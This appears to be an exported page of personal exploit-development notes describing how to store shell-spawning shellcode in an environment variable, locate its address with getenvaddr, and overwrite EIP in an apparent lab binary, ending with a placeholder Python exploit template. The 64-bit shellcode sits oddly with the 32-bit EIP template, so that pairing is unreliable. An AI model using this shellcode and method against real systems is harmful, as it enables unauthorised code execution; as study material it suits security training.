<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Option 3 - Write shellcode into environment variable</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Option 3 - Write shellcode into environment variable</h1></strong><br />If you can run <code>export</code> on the target system, you can store your shellcode in an environment variable.<br /><br />Problems you can run into:<br />• Addresses of environment variables can differ a lot<br />   ◇ e.g. increasing the length of 1 environment variable by 1-2 bytes will also shift the address of your PWN environment variable by 1-2 bytes (or more)<br />   ◇ There isn&#39;t much room for innaccuracy :/<br /><br /><strong><h2>## How-to</h2></strong><br /><strong><h3>### 1. Find EIP overwrite</h3></strong><br />   1) Overflow buffer with cyclic pattern<br />   2) <code>gdb-peda</code> or <code>msf-pattern_offset</code> to find offsets to your cyclic pattern/EIP overwrite<br /><br /><strong><h3>### 2. Set environment variable</h3></strong><br />   - <code>export PWN=`python -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#39;`</code><br />   - Or write the shellcode into a script and print it:<br />      → <code>export PWN=`python shellcode.py`</code><br /><br /><strong><h3>### 3. Find address of environment variable</h3></strong><br />• Use the <code>getenvaddr</code> binary from Hacking: The Art of Exploitation<br />   ◇ will have to compile it yourself<br />   ◇ available here - <a href="https://github.com/historypeats/getenvaddr">https://github.com/historypeats/getenvaddr</a><br />   ◇ How it works:<br />      ▪ uses <code>getenv</code> function to find address of specified environment variable<br />      ▪ adjusts the address for the program name by subtracting the length of the target binary name from the <code>getenvaddr</code> binary name (so that the address will be correct when you run the target binary)<br /><br />    <code>gcc getenvaddr.c -o getenvaddr<br /></code>    <code>chmod +x getenvaddr</code><br /><br />    <code>./getenvaddr &lt;environment variable&gt; &lt;target binary&gt;</code><br />    <code>./getenvaddr PWN bin/stack5</code><br /><br /><strong><h2>## Template</h2></strong><br /><div class="codebox"><div class="codebox">#!/usr/bin/env&nbsp;python<br /><br />import&nbsp;struct<br /><br />#&nbsp;PAYLOAD<br />#&nbsp;-----------------------------------------------------------<br />offset_to_eip&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;0<br />overwrite_eip&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0x42424242)&nbsp;&nbsp;&nbsp;#&nbsp;overwrite&nbsp;EIP&nbsp;with&nbsp;address&nbsp;of&nbsp;environment&nbsp;variable<br /><br />payload&nbsp;=&nbsp;offset_to_eip&nbsp;+&nbsp;overwrite_eip<br /><br />#&nbsp;EXPLOIT<br />#&nbsp;-----------------------------------------------------------<br />print&nbsp;payload</div></div><br /><br /></div>
</body>
</html>
